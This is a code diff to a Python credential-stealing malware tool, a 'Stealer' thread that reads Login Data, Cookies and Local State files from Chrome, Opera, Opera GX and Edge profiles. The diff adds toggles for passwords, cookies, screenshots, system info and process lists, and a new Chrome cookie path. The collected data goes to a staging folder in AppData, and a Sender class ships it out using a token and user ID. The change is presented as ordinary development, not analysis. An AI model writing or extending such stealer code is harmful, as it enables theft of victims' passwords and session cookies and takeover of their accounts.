@@ -11,11 +11,18 @@ from .browsers.chromium import Chromium
 
 class Stealer(Thread):
 
-    def __init__(self, token: str, user_id: int, errors: bool = False):
+    def __init__(self, token: str, user_id: int, errors: bool = False, **kwargs):
         Thread.__init__(self, name="Stealer")
 
         self.token = token
         self.user_id = user_id
+
+        self.passwords = kwargs["passwords"] if "passwords" in kwargs else True
+        self.processes = kwargs["processes"] if "processes" in kwargs else True
+        self.cookies = kwargs["cookies"] if "cookies" in kwargs else True
+        self.system = kwargs["system"] if "system" in kwargs else True
+        self.screen = kwargs["screen"] if "screen" in kwargs else True
+
         self.errors = errors
 
         self.user = getuser()
@@ -23,48 +30,65 @@ class Stealer(Thread):
         self.storage_path = f"C:/Users/{self.user}/AppData/"
         self.storage_folder = "stink/"
 
-        self.browsers = [
+        self.methods = [
             {
-                "method": Chromium(
+                "object": Chromium(
                     "Chrome",
                     self.storage_path,
                     self.storage_folder,
                     rf"{environ['USERPROFILE']}{sep}AppData\Local\Google\Chrome\User Data\Local State",
                     rf"{environ['USERPROFILE']}{sep}AppData\Local\Google\Chrome\User Data\Default\Cookies",
                     rf"{environ['USERPROFILE']}{sep}AppData\Local\Google\Chrome\User Data\Default\Login Data",
+                    rf"{environ['USERPROFILE']}{sep}AppData\Local\Google\Chrome\User Data\Default\Network\Cookies",
+                    (self.passwords, self.cookies),
                     self.errors
                 )
             },
             {
-                "method": Chromium(
+                "object": Chromium(
                     "Opera GX",
                     self.storage_path,
                     self.storage_folder,
                     rf"{environ['USERPROFILE']}{sep}AppData\Roaming\Opera Software\Opera GX Stable\Local State",
                     rf"{environ['USERPROFILE']}{sep}AppData\Roaming\Opera Software\Opera GX Stable\Cookies",
                     rf"{environ['USERPROFILE']}{sep}AppData\Roaming\Opera Software\Opera GX Stable\Login Data",
+                    "",
+                    (self.passwords, self.cookies),
                     self.errors
                 )
             },
             {
-                "method": Chromium(
+                "object": Chromium(
                     "Opera Default",
                     self.storage_path,
                     self.storage_folder,
                     rf"{environ['USERPROFILE']}{sep}AppData\Roaming\Opera Software\Opera Stable\Local State",
                     rf"{environ['USERPROFILE']}{sep}AppData\Roaming\Opera Software\Opera Stable\Cookies",
                     rf"{environ['USERPROFILE']}{sep}AppData\Roaming\Opera Software\Opera Stable\Login Data",
+                    "",
+                    (self.passwords, self.cookies),
                     self.errors
                 )
             },
             {
-                "method": Chromium(
+                "object": Chromium(
                     "Microsoft Edge",
                     self.storage_path,
                     self.storage_folder,
                     rf"{environ['USERPROFILE']}{sep}AppData\Local\Microsoft\Edge\User Data\Local State",
                     rf"{environ['USERPROFILE']}{sep}AppData\Local\Microsoft\Edge\User Data\Default\Cookies",
                     rf"{environ['USERPROFILE']}{sep}AppData\Local\Microsoft\Edge\User Data\Default\Login Data",
+                    "",
+                    (self.passwords, self.cookies),
+                    self.errors
+                )
+            },
+            {
+                "object": System(
+                    self.storage_path,
+                    self.storage_folder,
+                    "/System",
+                    (self.screen, self.system, self.processes),
                     self.errors
                 )
             }
@@ -73,11 +97,8 @@ class Stealer(Thread):
     def __create_storage(self):
 
         if not path.exists(f"{self.storage_path}{self.storage_folder}"):
-
             mkdir(f"{self.storage_path}{self.storage_folder}")
-
         else:
-
             rmtree(f"{self.storage_path}{self.storage_folder}")
             mkdir(f"{self.storage_path}{self.storage_folder}")
 
@@ -87,18 +108,12 @@ class Stealer(Thread):
 
             self.__create_storage()
 
-            for browser in self.browsers:
-                browser["method"].run()
+            for method in self.methods:
+                method["object"].run()
 
-            System(self.storage_path, self.storage_folder, "/System", self.errors).run()
             Sender(self.zip_name, self.storage_path, self.storage_folder, self.token, self.user_id, self.errors).run()
 
         except Exception as e:
 
             if self.errors is True:
-
                 print(f"[MULTISTEALER]: {repr(e)}")
-
-            else:
-
-                pass
